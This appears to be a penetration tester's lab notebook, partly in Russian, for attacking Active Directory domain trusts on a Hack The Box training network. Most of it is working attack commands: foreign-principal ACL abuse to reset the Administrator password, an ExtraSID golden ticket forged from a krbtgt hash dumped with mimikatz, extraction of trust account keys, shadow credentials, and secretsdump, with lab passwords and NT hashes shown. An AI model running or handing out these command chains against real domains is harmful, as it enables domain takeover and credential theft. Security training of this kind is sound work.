# Domain_trust


Get-ADUser -Filter * -Server "CHILD-DC.child.inlanefreight.ad"

# 1 Злоупотребление правами иностранных принципалов ACL
 
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt /v:10.129.71.9 /dynamic-resolution /drive:share,/home/max/share

./Rubeus createnetonly /program:powershell.exe /show
.\Rubeus.exe asktgt /user:htb-student /password:HTB_@cademy_stdnt /domain:child.inlanefreight.ad /ptt
Get-ADGroupMember "SVC_ADMINS" -Server INLANEFREIGHT.AD
Get-DomainGroupMember -Identity 'SVC_ADMINS' -Domain inlanefreight.ad -Verbose

для юзера ---
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'Test@1234!!!' -AsPlainText -Force
Set-DomainUserPassword -identity Administrator -AccountPassword $pass -domain inlanefreight.ad -verbose
.\Rubeus.exe asktgt /user:Administrator /password:'Test@1234!!!' /domain:inlanefreight.ad /ptt

через powershell
$pass = ConvertTo-SecureString 'Test@1234' -AsPlainText -Force
Set-ADAccountPassword -Identity Administrator -Server inlanefreight.ad -NewPassword $pass -Reset

для группы --- добавление в группу
Import-Module .\PowerView.ps1
Add-DomainGroupMember -identity 'Administrators' -Members 'child\htb-student' -Domain inlanefreight.ad -Verbose
in kali - sudo ~/Downloads/chisel client 10.129.71.9:8080 socks
 
 proxychains xfreerdp /u:htb-student /p:HTB_@cademy_stdnt /v:172.16.114.3 /dynamic-resolution /drive:share,/home/max/share
and search flag in admin desctop

#	2 EXTRA SID

проверка включена ли sid история в домене

Import-Module .\PowerView.ps1	

Get-DomainTrust -domain APEXCARGO.AD	

Get-DomainTrust -domain APEXCARGO.AD | Where-Object {$_.TargetName -eq "inlanefreight.ad"} | Select TrustAttributes

--> The results show the presence of TREAT_AS_EXTERNAL within the TrustAttributes field, indicating that SID History is indeed still enabled in the domain.

To perform this attack, we need the following:
    The KRBTGT hash for the current domain (INLANEFREIGHT.AD)
    The SID for the current domain (INLANEFREIGHT.AD)
    The name of a target user in the current domain (Administrator)
    The FQDN of the current domain. (INLANEFREIGHT.AD)
    The SID of the high privileged group of the target domain (HR_MANAGEMENT)

We are attacking from INLANEFREIGHT.AD to DC03.apexcargo.ad!!!!

.\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt" exit
6f639a6054a3d9852409e9ad7e41893b

Import-Module .\PowerView.ps1

PS C:\Tools> Get-DomainSID -Domain INLANEFREIGHT.AD
S-1-5-21-1407615112-106284543-3058975305

Get-ADGroup -Identity 'HR_MANAGEMENT' -Server "APEXCARGO.AD"
S-1-5-21-990245489-431684941-3923950027-1112

 .\Rubeus.exe golden /rc4:6f639a6054a3d9852409e9ad7e41893b /domain:INLANEFREIGHT.AD /sid:S-1-5-21-1407615112-106284543-3058975305 /sids:S-1-5-21-990245489-431684941-3923950027-1112 /user:Administrator /ptt

 mimikatz # lsadump::dcsync /domain:APEXCARGO.AD /user:Administrator


proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -X "cat C:\Users\Administrator\Desktop\flag.txt"
proxychains xfreerdp /v:172.16.114.10 /u:Administrator /pth:2cd9f13c4aa3b468308525a93696e5a1 /dynamic-resolution /drive:share,/home/max/share

Enter-PSSession DC03.apexcargo.ad

# 3 Атака на доверенный аккаунт (Trust Account Attack)  атакуем MSSP.AD --> [ Out ] MSSP.AD -> APEXCARGO.AD

proxychains evil-winrm -i 172.16.114.10 -u administrator -H 2cd9f13c4aa3b468308525a93696e5a1
upload tools.zip
Expand-Archive -Path "tools.zip" -DestinationPath ".\tools"

 Get-ADTrust -Identity mssp.ad
 
 Extracting the Forest Trust Keys
 загружаем mimikatz.exe
 
 printf 'use C$\ncd Windows\\Temp\nput /home/max/share/mimikatz.exe\nls mimikatz.exe\nexit\n' | proxychains smbclient.py APEXCARGO.AD/Administrator@172.16.114.10 -hashes :2cd9f13c4aa3b468308525a93696e5a1
 
proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -x 'C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::trust /patch /name:MSSP.AD" "exit"'

 proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -x 'C:\Users\Administrator\Documents\tools\mimikatz.exe "privilege::debug" "lsadump::trust /patch /name:MSSP.AD" "exit"'
 [ Out ] MSSP.AD -> APEXCARGO.AD * rc4_hmac_nt       dfa31016f0e6c91ef6e0b724a7457c0e
 
proxychains nxc ldap 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -d APEXCARGO.AD --get-sid
Domain SID S-1-5-21-990245489-431684941-3923950027

 
 [ Out ] MSSP.AD -> APEXCARGO.AD
 * rc4_hmac_nt       dfa31016f0e6c91ef6e0b724a7457c0e
 9384875ff5e9f363a7bde305b72e2f7e
 получаем билет MSSP.AD
 
 proxychains getTGT.py MSSP.AD/'APEXCARGO$' -hashes :9384875ff5e9f363a7bde305b72e2f7e -dc-ip 172.16.114.15

проверка работы билета

KRB5CCNAME=APEXCARGO\$.ccache proxychains GetADUsers.py -k -no-pass -dc-ip 172.16.114.15 MSSP.AD/'APEXCARGO$' -all

меняем пароль 

KRB5CCNAME=APEXCARGO\$.ccache proxychains bloodyAD -k -d mssp.ad --host DC04.mssp.ad --dc-ip 172.16.114.15 -u 'APEXCARGO$' set password harry 'Test@1234!' 

проверяем изменения

proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' --shares
proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' -x "C:\Users\Administrator\Desktop\flag.txt"
proxychains nxc smb 172.16.114.15 -u harry -p 'Test@1234!' -x "type C:\Users\Administrator\Desktop\flag.txt"
*****************************************
# 4 учетные записи в другом домене

bloodyAD --host DC05.fabricorp.ad -d fabricorp.ad -u 'harry@mssp.ad' -p 'Test@1234!' set object ALEX servicePrincipalName -v 'HTTP/alex.fabricorp.ad'

 proxychains bloodyAD -d mssp.ad -u 'harry' -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 set object ALEX servicePrincipalName -v 'HTTP/alex.fabricorp.ad'
proxychains bloodyAD -d mssp.ad -u 'harry' -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 set password ALEX 'Test@1234!'

сбрасываем пароль

proxychains nxc ldap 172.16.114.20 -d fabricorp.ad -u ALEX -p 'Test@1234!' --users

эта комндда создаст shados credentials

proxychains bloodyAD -d fabricorp.ad -u ALEX -p 'Test@1234!' --host DC05.fabricorp.ad --dc-ip 172.16.114.20 add shadowCredentials 'DC05$'

NT: 4b61e8dc1702261873c1775480ac1a0f

получаем хеш админа
proxychains impacket-secretsdump -hashes :4b61e8dc1702261873c1775480ac1a0f 'fabricorp.ad/DC05$@172.16.114.20' -just-dc-user Administrator

проверяем
proxychains impacket-wmiexec -hashes :288d7f5ef7d82e5fabc5227e99faa5c6 'fabricorp.ad/Administrator@172.16.114.20' 'type C:\Users\Administrator\Desktop\flag.txt'
